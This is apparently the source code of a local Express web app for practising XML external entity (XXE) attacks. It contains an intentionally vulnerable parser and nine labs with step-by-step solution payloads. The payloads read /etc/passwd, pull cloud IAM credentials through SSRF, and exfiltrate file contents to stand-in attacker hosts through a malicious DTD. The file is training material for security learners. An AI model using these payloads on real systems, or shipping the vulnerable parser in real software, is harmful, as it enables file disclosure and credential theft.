const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3001;

app.use(express.text({ type: ['text/xml', 'application/xml', 'application/soap+xml'] }));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const upload = multer({ dest: path.join(__dirname, 'uploads') });

// ─── Simulated server files ────────────────────────────────────────────────
const SERVER_FILES = {
  '/etc/passwd': `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash`,
  '/etc/hostname': 'xxe-lab-server',
  '/etc/hosts': `127.0.0.1   localhost
127.0.1.1   xxe-lab-server
192.168.1.1 internal-service.local`,
  '/home/carlos/secret': 'FLAG{xxe_file_read_success_abc123}',
  'C:\\Windows\\System32\\drivers\\etc\\hosts': `# Windows hosts file
127.0.0.1   localhost
::1         localhost`,
};

const INTERNAL_URLS = {
  'http://169.254.169.254/latest/meta-data/': `ami-id
ami-launch-index
hostname
iam/
instance-id
instance-type
local-hostname
local-ipv4`,
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/': 'admin-role',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role': JSON.stringify({
    Code: 'Success',
    Type: 'AWS-HMAC',
    AccessKeyId: 'ASIAXXXXXXXXXEXAMPLE',
    SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    Token: 'AQoXnyc4lcK4w4OIaYnuFT...',
    Expiration: '2030-01-01T00:00:00Z',
  }),
  'http://internal-service.local/admin': '<adminPanel><secret>INTERNAL_ADMIN_KEY_789</secret></adminPanel>',
};

// ─── OOB interaction log (simulates Burp Collaborator) ─────────────────────
const oobLog = [];

// ─── Helpers ──────────────────────────────────────────────────────────────

function resolveFile(filePath) {
  return SERVER_FILES[filePath] || null;
}

function resolveUrl(url) {
  return INTERNAL_URLS[url] || null;
}

// Intentionally vulnerable XML parser — resolves external entities from our simulated filesystem
function parseXmlVulnerable(xmlString, options = {}) {
  const result = { productId: null, storeId: null, error: null, rawXml: xmlString };

  // Extract DOCTYPE and entities
  const doctypeMatch = xmlString.match(/<!DOCTYPE[^[]*\[([^\]]*)\]>/s);
  const entities = {};
  const paramEntities = {};

  if (doctypeMatch) {
    const dtdContent = doctypeMatch[1];

    // Parse regular entities: <!ENTITY name SYSTEM "url">
    const entityRegex = /<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)"\s*>/g;
    let m;
    while ((m = entityRegex.exec(dtdContent)) !== null) {
      const name = m[1];
      const src = m[2];
      if (src.startsWith('file://')) {
        const filePath = src.replace('file://', '');
        const content = resolveFile(filePath);
        if (options.blockRegularEntities) {
          result.error = 'External entity resolution is disabled.';
          return result;
        }
        entities[name] = content !== null ? content : `[File not found: ${filePath}]`;
      } else if (src.startsWith('http://') || src.startsWith('https://')) {
        if (options.blockOutbound) {
          result.error = 'Outbound connections blocked by firewall.';
          return result;
        }
        const content = resolveUrl(src);
        oobLog.push({ type: 'HTTP', url: src, time: new Date().toISOString() });
        entities[name] = content !== null ? content : `[HTTP fetch: ${src}]`;
      }
    }

    // Parse parameter entities: <!ENTITY % name SYSTEM "url">
    const paramEntityRegex = /<!ENTITY\s+%\s+(\w+)\s+SYSTEM\s+"([^"]+)"\s*>/g;
    while ((m = paramEntityRegex.exec(dtdContent)) !== null) {
      const name = m[1];
      const src = m[2];
      if (src.startsWith('file://')) {
        const filePath = src.replace('file://', '');
        const content = resolveFile(filePath);
        paramEntities[name] = content !== null ? content : `[File not found: ${filePath}]`;
      } else if (src.startsWith('http://') || src.startsWith('https://')) {
        if (options.blockOutbound) {
          result.error = 'Outbound connections blocked by firewall.';
          return result;
        }
        const content = resolveUrl(src);
        oobLog.push({ type: 'HTTP', url: src, time: new Date().toISOString() });
        paramEntities[name] = content !== null ? content : `[External DTD loaded from: ${src}]`;
      }
    }

    // Evaluate %entity; references in DTD (simulate DTD entity expansion)
    const paramRefRegex = /%(\w+);/g;
    while ((m = paramRefRegex.exec(dtdContent)) !== null) {
      const name = m[1];
      if (paramEntities[name]) {
        // Simulate OOB callback detection
        oobLog.push({ type: 'DTD_EVAL', entity: name, time: new Date().toISOString() });
      }
    }
  }

  // XInclude detection
  const xincludeMatch = xmlString.match(/xi:include[^/]*href="([^"]+)"/);
  if (xincludeMatch && options.allowXInclude !== false) {
    const href = xincludeMatch[1];
    if (href.startsWith('file://')) {
      const filePath = href.replace('file://', '');
      const content = resolveFile(filePath);
      result.xincludeContent = content !== null ? content : `[File not found: ${filePath}]`;
      result.xincludeUsed = true;
      return result;
    }
  }

  // Extract element values and substitute entities
  let body = xmlString;
  // Remove DOCTYPE
  body = body.replace(/<!DOCTYPE[^[]*\[[^\]]*\]>/s, '');
  // Replace entity references with resolved values
  for (const [name, value] of Object.entries(entities)) {
    body = body.split(`&${name};`).join(value || '');
  }

  const pidMatch = body.match(/<productId>([^<]*)<\/productId>/);
  const sidMatch = body.match(/<storeId>([^<]*)<\/storeId>/);

  if (pidMatch) result.productId = pidMatch[1].trim();
  if (sidMatch) result.storeId = sidMatch[1].trim();

  return result;
}

// ─── Lab definitions ──────────────────────────────────────────────────────

const labs = [
  {
    id: 1,
    title: 'Exploiting XXE using external entities to retrieve files',
    difficulty: 'APPRENTICE',
    difficultyClass: 'apprentice',
    description: 'This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.',
    objective: 'Inject an XML external entity to retrieve the contents of the <code>/etc/passwd</code> file.',
    background: `<p>The stock check feature sends XML to the server. The server parses the XML and returns the <code>productId</code> value in the response. Since the parser resolves external entities, you can define an entity that reads a local file.</p>`,
    hint: `Modify the <code>productId</code> element. Add a DOCTYPE block declaring an external entity that points to <code>file:///etc/passwd</code>, then reference that entity inside <code>&lt;productId&gt;</code>.`,
    solution: `
<h3>Step-by-Step Solution</h3>
<ol>
  <li>Intercept the "Check stock" request and observe the XML structure:
    <pre><?xml version="1.0" encoding="UTF-8"?>
&lt;stockCheck&gt;
  &lt;productId&gt;1&lt;/productId&gt;
  &lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck&gt;</pre>
  </li>
  <li>Add a DOCTYPE block declaring an external entity:
    <pre>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</pre>
  </li>
  <li>Replace <code>1</code> inside <code>&lt;productId&gt;</code> with <code>&amp;xxe;</code></li>
  <li>The final payload:
    <pre><?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;stockCheck&gt;
  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
  &lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck&gt;</pre>
  </li>
  <li>The response will contain the contents of <code>/etc/passwd</code> inside the error message.</li>
</ol>`,
    endpoint: '/lab1/stock',
    method: 'POST',
  },
  {
    id: 2,
    title: 'Exploiting XXE to perform SSRF attacks',
    difficulty: 'APPRENTICE',
    difficultyClass: 'apprentice',
    description: 'This lab has a "Check stock" feature that parses XML input. The server is running on a cloud platform and an internal metadata service is available at <code>http://169.254.169.254/</code>.',
    objective: 'Exploit the XXE vulnerability to perform a server-side request forgery (SSRF) attack that retrieves the AWS IAM security credentials from the metadata endpoint.',
    background: `<p>The XML parser is configured to resolve external HTTP entities. Point an entity at an internal URL to make the server fetch it on your behalf — this is SSRF via XXE.</p>`,
    hint: 'Point the external entity at <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> to get the IAM role name, then fetch the credentials.',
    solution: `
<h3>Step-by-Step Solution</h3>
<ol>
  <li>First, send this payload to discover the IAM role name:
    <pre><?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt; ]&gt;
&lt;stockCheck&gt;
  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
  &lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck&gt;</pre>
  </li>
  <li>The response returns the role name: <code>admin-role</code></li>
  <li>Now fetch the actual credentials:
    <pre><?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"&gt; ]&gt;
&lt;stockCheck&gt;
  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
  &lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck&gt;</pre>
  </li>
  <li>The response returns the <code>SecretAccessKey</code> and temporary <code>Token</code>.</li>
</ol>`,
    endpoint: '/lab2/stock',
    method: 'POST',
  },
  {
    id: 3,
    title: 'Blind XXE with out-of-band interaction',
    difficulty: 'PRACTITIONER',
    difficultyClass: 'practitioner',
    description: 'This lab has a "Check stock" feature that parses XML input but <strong>does not return any entity values</strong> in its response.',
    objective: 'Detect the XXE vulnerability by causing the server to make a DNS lookup to a domain you control (simulated in this lab by the OOB Interaction Log below).',
    background: `<p>The server is vulnerable but never reflects entity values. You cannot see file contents directly. Instead, use an entity pointing to an attacker-controlled URL — the server will make an outbound request that you can observe.</p>`,
    hint: 'Define an external entity pointing to <code>http://collaborator.attacker.com/</code> and reference it. Use the OOB Interaction Log on this page to see if the server made a request.',
    solution: `
<h3>Step-by-Step Solution</h3>
<ol>
  <li>Send the following payload to the stock check endpoint:
    <pre><?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://collaborator.attacker.com/"&gt; ]&gt;
&lt;stockCheck&gt;
  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
  &lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck&gt;</pre>
  </li>
  <li>The response body will not contain the entity value — the server says "Invalid productId".</li>
  <li>However, check the <strong>OOB Interaction Log</strong> below the lab form. You will see a DNS/HTTP interaction recorded, confirming the vulnerability exists.</li>
</ol>`,
    endpoint: '/lab3/stock',
    method: 'POST',
  },
  {
    id: 4,
    title: 'Blind XXE with out-of-band interaction via XML parameter entities',
    difficulty: 'PRACTITIONER',
    difficultyClass: 'practitioner',
    description: 'This lab has a blind XXE vulnerability. The application blocks standard external entity declarations but <strong>does not block XML parameter entities</strong>.',
    objective: 'Use XML parameter entities to make the server perform an out-of-band DNS interaction to a domain you control.',
    background: `<p>Some applications filter <code>&lt;!ENTITY name SYSTEM ...&gt;</code> declarations (regular entities) but do not filter <code>&lt;!ENTITY % name SYSTEM ...&gt;</code> (parameter entities). Parameter entities are evaluated inside the DTD itself, not in the document body.</p>`,
    hint: 'Use <code>%entity;</code> syntax. Declare a parameter entity with SYSTEM pointing to your URL, then reference it as <code>%name;</code> inside the DOCTYPE.',
    solution: `
<h3>Step-by-Step Solution</h3>
<ol>
  <li>Regular entity payload is blocked. Try the parameter entity approach:
    <pre><?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://collaborator.attacker.com/"&gt; %xxe; ]&gt;
&lt;stockCheck&gt;
  &lt;productId&gt;1&lt;/productId&gt;
  &lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck&gt;</pre>
  </li>
  <li><code>%xxe;</code> is evaluated during DTD processing — before the document body — so the outbound request fires even though there is no entity reference in the body.</li>
  <li>Check the OOB Interaction Log to confirm the server made an outbound request.</li>
</ol>`,
    endpoint: '/lab4/stock',
    method: 'POST',
  },
  {
    id: 5,
    title: 'Exploiting blind XXE to exfiltrate data using a malicious external DTD',
    difficulty: 'PRACTITIONER',
    difficultyClass: 'practitioner',
    description: 'This lab has a blind XXE vulnerability. An "exploit server" is available to host a malicious external DTD. The server does not block outbound connections.',
    objective: 'Read the contents of <code>/etc/passwd</code> by hosting a malicious DTD that exfiltrates the file contents via an out-of-band HTTP request.',
    background: `<p>To exfiltrate file data via OOB, you need a two-stage attack: host a DTD that defines nested parameter entities — one reads the file and another sends it to your server inside a URL.</p>`,
    hint: `Store the malicious DTD on the exploit server below, then reference it from the XXE payload. The OOB log simulates your attacker server receiving the exfiltrated data.`,
    solution: `
<h3>Step-by-Step Solution</h3>
<ol>
  <li>Use the <strong>Exploit Server</strong> to store this DTD at <code>http://exploit-server.local/evil.dtd</code>:
    <pre>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://exploit-server.local/?x=%file;'&gt;"&gt;
%eval;
%exfiltrate;</pre>
  </li>
  <li>Send this payload to the stock check:
    <pre><?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://exploit-server.local/evil.dtd"&gt; %xxe; ]&gt;
&lt;stockCheck&gt;
  &lt;productId&gt;1&lt;/productId&gt;
&lt;/stockCheck&gt;</pre>
  </li>
  <li>The file contents appear as a URL query parameter in the OOB log.</li>
  <li><strong>Why <code>&amp;#x25;</code>?</strong> Inside an entity value in an external DTD, a literal <code>%</code> is not allowed. You must escape it as the hex entity <code>&amp;#x25;</code>.</li>
</ol>`,
    endpoint: '/lab5/stock',
    method: 'POST',
  },
  {
    id: 6,
    title: 'Exploiting blind XXE to retrieve data via error messages',
    difficulty: 'PRACTITIONER',
    difficultyClass: 'practitioner',
    description: 'This lab has a blind XXE vulnerability. The application returns verbose XML parsing errors. Outbound connections are available.',
    objective: 'Retrieve the contents of <code>/etc/passwd</code> by triggering an XML parsing error whose message contains the file contents.',
    background: `<p>If the application reflects XML parser errors (like stack traces or file-not-found messages), you can craft a payload that reads a file and then tries to open a nonexistent file path that includes the file's contents. The parser error leaks the data.</p>`,
    hint: 'Your malicious DTD should read the file into a parameter entity, then attempt to load a path like <code>file:///nonexistent/[file contents]</code>. The parser will throw an error showing that path.',
    solution: `
<h3>Step-by-Step Solution</h3>
<ol>
  <li>Store this DTD on the exploit server:
    <pre>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
%eval;
%error;</pre>
  </li>
  <li>Send this payload to the stock check:
    <pre><?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://exploit-server.local/evil.dtd"&gt; %xxe; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;/stockCheck&gt;</pre>
  </li>
  <li>The response contains an XML parsing error:
    <pre>java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:...</pre>
  </li>
  <li>The file path in the error message includes the contents of <code>/etc/passwd</code>.</li>
</ol>`,
    endpoint: '/lab6/stock',
    method: 'POST',
  },
  {
    id: 7,
    title: 'Exploiting XInclude to retrieve files',
    difficulty: 'PRACTITIONER',
    difficultyClass: 'practitioner',
    description: 'This lab has a product page with a "Check stock" feature. Your input is <strong>embedded inside a server-side XML document</strong> — you cannot control the DOCTYPE.',
    objective: 'Use an XInclude attack to retrieve the contents of <code>/etc/passwd</code>.',
    background: `<p>When the application embeds your input directly into an XML document on the server side, you cannot inject a DOCTYPE because the parser has already started parsing the outer document. XInclude lets you include files at the element level — no DOCTYPE required.</p>
    <p>Send the XInclude payload as the value of the <code>productId</code> form field.</p>`,
    hint: `Your payload must include the XInclude namespace declaration. Put the entire payload as the value of the productId parameter in the form.`,
    solution: `
<h3>Step-by-Step Solution</h3>
<ol>
  <li>The application embeds the productId directly into XML:
    <pre>&lt;stockCheck&gt;&lt;productId&gt;YOUR INPUT&lt;/productId&gt;&lt;/stockCheck&gt;</pre>
  </li>
  <li>You cannot add a DOCTYPE, but you can inject an XInclude element as the value:
    <pre>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;</pre>
  </li>
  <li>Submit this as the productId. The server embeds it into the XML and when parsed, the XInclude instruction retrieves <code>/etc/passwd</code>.</li>
  <li>The file contents appear in the application response.</li>
</ol>`,
    endpoint: '/lab7/stock',
    method: 'POST',
  },
  {
    id: 8,
    title: 'Exploiting XXE via image file upload',
    difficulty: 'PRACTITIONER',
    difficultyClass: 'practitioner',
    description: 'This lab allows users to upload avatars. The upload functionality accepts SVG files and renders them server-side.',
    objective: 'Upload a malicious SVG file that exploits XXE to read <code>/etc/hostname</code> and display it in the rendered image.',
    background: `<p>SVG (Scalable Vector Graphics) is an XML-based image format. When the server processes SVG files (e.g., to generate thumbnails), the XML parser may resolve external entities. This turns file upload into an XXE attack vector.</p>`,
    hint: `Create an SVG file with a DOCTYPE block that reads a file, then references the entity in a <code>&lt;text&gt;</code> element. The rendered SVG will contain the file contents.`,
    solution: `
<h3>Step-by-Step Solution</h3>
<ol>
  <li>Create a malicious SVG file with this content:
    <pre>&lt;?xml version="1.0" standalone="yes"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt; ]&gt;
&lt;svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg"&gt;
  &lt;text font-size="16" y="30"&gt;&amp;xxe;&lt;/text&gt;
&lt;/svg&gt;</pre>
  </li>
  <li>Upload the SVG using the avatar upload form.</li>
  <li>The server parses the SVG XML, resolves <code>&amp;xxe;</code> to the contents of <code>/etc/hostname</code>, and returns the rendered content.</li>
  <li>The server hostname appears in the response.</li>
</ol>`,
    endpoint: '/lab8/upload',
    method: 'POST',
  },
  {
    id: 9,
    title: 'Exploiting XXE to retrieve data by repurposing a local DTD',
    difficulty: 'EXPERT',
    difficultyClass: 'expert',
    description: 'This lab has a blind XXE vulnerability. The application blocks outbound connections, so you cannot use an external DTD. However, a local DTD file exists on the server at <code>/usr/share/yelp/dtd/docbookx.dtd</code> which defines the entity <code>%ISOamsa;</code>.',
    objective: 'Exfiltrate the contents of <code>/etc/passwd</code> using an error-based technique that repurposes the local DTD — without any outbound HTTP connections.',
    background: `<p>When OOB is blocked, the trick is to load a <em>local</em> DTD file that already exists on the server and redefine one of its parameter entities in your inline DOCTYPE. The XML specification allows local DTDs to be overridden in a hybrid DTD. This is a loophole that bypasses the outbound block.</p>`,
    hint: `Declare <code>%local_dtd</code> pointing to the local Yelp DTD. Before loading it, redefine <code>%ISOamsa</code> to contain the error-based exfiltration payload.`,
    solution: `
<h3>Step-by-Step Solution</h3>
<ol>
  <li>Confirm the local DTD exists by sending:
    <pre>&lt;!DOCTYPE foo [ &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt; %local_dtd; ]&gt;</pre>
    If no file-not-found error, the DTD exists.
  </li>
  <li>Redefine <code>%ISOamsa</code> to inject an error-based payload. Send:
    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
  &lt;!ENTITY % ISOamsa '
    &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
    &lt;!ENTITY &amp;#x25; eval
      "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM
        &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
    &amp;#x25;eval;
    &amp;#x25;error;
  '&gt;
  %local_dtd;
]&gt;
&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;/stockCheck&gt;</pre>
  </li>
  <li>The parser loads the local DTD, evaluates the redefined <code>%ISOamsa</code>, reads <code>/etc/passwd</code>, and throws an error containing the file contents.</li>
  <li>No outbound HTTP connection is required — everything uses the local filesystem.</li>
</ol>`,
    endpoint: '/lab9/stock',
    method: 'POST',
  },
];

// ─── Exploit server storage (Lab 5 / Lab 6) ──────────────────────────────
let exploitDtd = '';

// ─── HTML helpers ─────────────────────────────────────────────────────────

const css = `
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0a0e1a; color: #cdd3de; min-height: 100vh; }
  header { background: #1a1f2e; border-bottom: 2px solid #ff6a00; padding: 16px 32px; display: flex; align-items: center; gap: 16px; }
  header h1 { color: #ff6a00; font-size: 22px; font-weight: 700; letter-spacing: 1px; }
  header span { background: #ff6a00; color: #fff; border-radius: 4px; padding: 2px 10px; font-size: 12px; font-weight: 700; }
  .container { max-width: 1100px; margin: 0 auto; padding: 32px 24px; }
  .lab-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; margin-top: 28px; }
  .lab-card { background: #141824; border: 1px solid #2a2f3e; border-radius: 10px; padding: 22px; transition: border-color .2s; cursor: pointer; text-decoration: none; color: inherit; display: block; }
  .lab-card:hover { border-color: #ff6a00; }
  .lab-num { font-size: 11px; color: #888; margin-bottom: 6px; }
  .lab-title { font-size: 15px; font-weight: 600; color: #e4e8f0; margin-bottom: 10px; line-height: 1.4; }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; }
  .apprentice { background: #1a3a2a; color: #4caf82; border: 1px solid #4caf82; }
  .practitioner { background: #1a2a3a; color: #4a9eff; border: 1px solid #4a9eff; }
  .expert { background: #3a1a2a; color: #ff6a6a; border: 1px solid #ff6a6a; }
  .lab-desc { font-size: 13px; color: #8a94a8; margin-top: 10px; line-height: 1.5; }
  .lab-page { background: #141824; border: 1px solid #2a2f3e; border-radius: 10px; padding: 28px; margin-top: 24px; }
  .lab-page h2 { color: #e4e8f0; font-size: 20px; margin-bottom: 8px; }
  .lab-page .objective { background: #1a2535; border-left: 4px solid #4a9eff; padding: 12px 16px; border-radius: 4px; margin: 16px 0; font-size: 14px; }
  .lab-page .background { background: #1e1e2a; border-left: 4px solid #ff6a00; padding: 12px 16px; border-radius: 4px; margin: 16px 0; font-size: 14px; line-height: 1.6; }
  .lab-page .hint-box { background: #1a3020; border: 1px solid #2a6040; padding: 12px 16px; border-radius: 6px; margin: 16px 0; font-size: 13px; color: #90caa8; }
  textarea { width: 100%; background: #0d1117; color: #a8d4ff; border: 1px solid #2a2f3e; border-radius: 6px; padding: 14px; font-family: 'Courier New', monospace; font-size: 13px; line-height: 1.5; resize: vertical; min-height: 180px; }
  textarea:focus { outline: none; border-color: #4a9eff; }
  input[type=text] { width: 100%; background: #0d1117; color: #cdd3de; border: 1px solid #2a2f3e; border-radius: 6px; padding: 10px 12px; font-size: 14px; margin-bottom: 12px; }
  input[type=text]:focus { outline: none; border-color: #4a9eff; }
  button { background: #ff6a00; color: #fff; border: none; padding: 10px 22px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; transition: background .2s; }
  button:hover { background: #e05800; }
  button.secondary { background: #2a2f3e; color: #cdd3de; }
  button.secondary:hover { background: #3a3f4e; }
  .response-box { background: #0d1117; border: 1px solid #2a2f3e; border-radius: 6px; padding: 16px; margin-top: 16px; font-family: 'Courier New', monospace; font-size: 13px; color: #a8d4ff; white-space: pre-wrap; word-break: break-word; min-height: 60px; max-height: 300px; overflow-y: auto; }
  .response-box.success { border-color: #4caf82; color: #90caa8; }
  .response-box.error { border-color: #ff6a6a; color: #ffaaaa; }
  .solution-box { background: #0d1117; border: 1px solid #2a4a2a; border-radius: 6px; padding: 20px; margin-top: 20px; display: none; }
  .solution-box.visible { display: block; }
  .solution-box h3 { color: #4caf82; margin-bottom: 12px; }
  .solution-box pre { background: #1a1f2e; padding: 12px; border-radius: 4px; font-size: 12px; color: #a8d4ff; overflow-x: auto; white-space: pre-wrap; margin: 10px 0; }
  .solution-box ol { padding-left: 20px; line-height: 1.8; font-size: 13px; }
  .oob-log { background: #0d1117; border: 1px solid #2a3a4a; border-radius: 6px; padding: 16px; margin-top: 16px; font-family: 'Courier New', monospace; font-size: 12px; color: #70b0e0; min-height: 60px; max-height: 200px; overflow-y: auto; }
  .oob-log .entry { padding: 4px 0; border-bottom: 1px solid #1a2030; }
  .oob-log .empty { color: #556; font-style: italic; }
  .store-widget { display: flex; align-items: center; gap: 16px; margin-bottom: 20px; }
  .store-select { background: #0d1117; color: #cdd3de; border: 1px solid #2a2f3e; border-radius: 6px; padding: 8px 12px; font-size: 13px; }
  .file-input { display: none; }
  .file-label { display: inline-block; background: #2a2f3e; color: #cdd3de; padding: 10px 18px; border-radius: 6px; cursor: pointer; font-size: 13px; border: 1px solid #3a4050; }
  .file-label:hover { background: #3a3f4e; }
  .tabs { display: flex; gap: 4px; border-bottom: 1px solid #2a2f3e; margin-bottom: 20px; }
  .tab { padding: 8px 18px; cursor: pointer; font-size: 13px; color: #8a94a8; border-bottom: 2px solid transparent; }
  .tab.active { color: #ff6a00; border-bottom-color: #ff6a00; }
  nav { margin-bottom: 16px; }
  nav a { color: #4a9eff; text-decoration: none; font-size: 13px; }
  nav a:hover { text-decoration: underline; }
  code { background: #1a1f2e; padding: 1px 5px; border-radius: 3px; font-size: 12px; color: #a8d4ff; }
  hr { border: none; border-top: 1px solid #2a2f3e; margin: 20px 0; }
  .flag-box { background: #1a3020; border: 1px solid #4caf82; border-radius: 6px; padding: 12px 18px; margin-top: 16px; font-family: monospace; font-size: 14px; color: #4caf82; display: none; }
  .flag-box.visible { display: block; }
</style>`;

function page(title, body) {
  return `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${title} — XXE Labs</title>${css}</head>
<body>
<header>
  <h1>XXE Injection Labs</h1>
  <span>PortSwigger Style</span>
</header>
<div class="container">${body}</div>
</body>
</html>`;
}

// ─── Routes: Dashboard ─────────────────────────────────────────────────────

app.get('/', (req, res) => {
  const cards = labs.map(lab => `
    <a class="lab-card" href="/lab/${lab.id}">
      <div class="lab-num">LAB ${lab.id}</div>
      <div class="lab-title">${lab.title}</div>
      <span class="badge ${lab.difficultyClass}">${lab.difficulty}</span>
      <p class="lab-desc">${lab.description}</p>
    </a>`).join('');

  const body = `
    <nav><a href="/">XXE Labs Dashboard</a></nav>
    <h2 style="color:#e4e8f0;margin-bottom:8px;">XML External Entity (XXE) Injection Labs</h2>
    <p style="color:#8a94a8;font-size:14px;">Practice XXE injection techniques in a safe, isolated environment. Labs mirror the PortSwigger Web Security Academy structure.</p>
    <div class="lab-grid">${cards}</div>`;

  res.send(page('Dashboard', body));
});

// ─── Routes: Individual Lab Pages ─────────────────────────────────────────

labs.forEach(lab => {
  app.get(`/lab/${lab.id}`, (req, res) => {
    let formHtml = '';

    if (lab.id === 8) {
      // File upload lab
      formHtml = `
        <form id="labForm" enctype="multipart/form-data">
          <p style="font-size:13px;color:#8a94a8;margin-bottom:12px;">Upload an avatar image (SVG files are supported):</p>
          <label class="file-label" for="svgUpload">Choose SVG file</label>
          <input class="file-input" type="file" id="svgUpload" name="avatar" accept=".svg,.xml,image/svg+xml">
          <span id="fileName" style="margin-left:12px;font-size:13px;color:#666;"></span>
          <br><br>
          <button type="submit">Upload Avatar</button>
        </form>
        <script>
          document.getElementById('svgUpload').onchange = function() {
            document.getElementById('fileName').textContent = this.files[0]?.name || '';
          };
          document.getElementById('labForm').onsubmit = async function(e) {
            e.preventDefault();
            const fd = new FormData(this);
            const resp = await fetch('${lab.endpoint}', { method: 'POST', body: fd });
            const text = await resp.text();
            document.getElementById('response').className = 'response-box ' + (resp.ok ? 'success' : 'error');
            document.getElementById('response').textContent = text;
            if (text.includes('xxe-lab-server') || text.includes('FLAG')) {
              document.getElementById('flag').className = 'flag-box visible';
              document.getElementById('flag').textContent = 'Lab Solved! Server hostname retrieved: ' + text.trim();
            }
          };
        </script>`;
    } else if (lab.id === 5 || lab.id === 6) {
      // Exploit server + blind labs
      formHtml = `
        <div class="tabs">
          <div class="tab active" onclick="showTab('attack')">Attack Payload</div>
          <div class="tab" onclick="showTab('exploit')">Exploit Server (DTD Host)</div>
          <div class="tab" onclick="showTab('oob')">OOB Interaction Log</div>
        </div>
        <div id="tab-attack">
          <p style="font-size:13px;color:#8a94a8;margin-bottom:12px;">Send XML to the stock check endpoint:</p>
          <textarea id="xmlPayload" placeholder="Enter XML payload here..."><?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://exploit-server.local/evil.dtd"> %xxe; ]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck></textarea>
          <br><br>
          <button onclick="sendPayload()">Send Payload</button>
        </div>
        <div id="tab-exploit" style="display:none;">
          <p style="font-size:13px;color:#8a94a8;margin-bottom:12px;">Store your malicious DTD at <code>http://exploit-server.local/evil.dtd</code>:</p>
          <textarea id="dtdContent" placeholder="Enter DTD content here..."></textarea>
          <br><br>
          <button onclick="storeDtd()">Store DTD</button>
          <span id="storeStatus" style="margin-left:12px;font-size:13px;color:#4caf82;"></span>
        </div>
        <div id="tab-oob" style="display:none;">
          <p style="font-size:13px;color:#8a94a8;margin-bottom:8px;">Out-of-band interactions from the server:</p>
          <div class="oob-log" id="oobLog"><span class="empty">No interactions yet. Send a payload to trigger OOB callbacks.</span></div>
          <button class="secondary" style="margin-top:10px;" onclick="refreshOob()">Refresh Log</button>
        </div>
        <script>
          function showTab(name) {
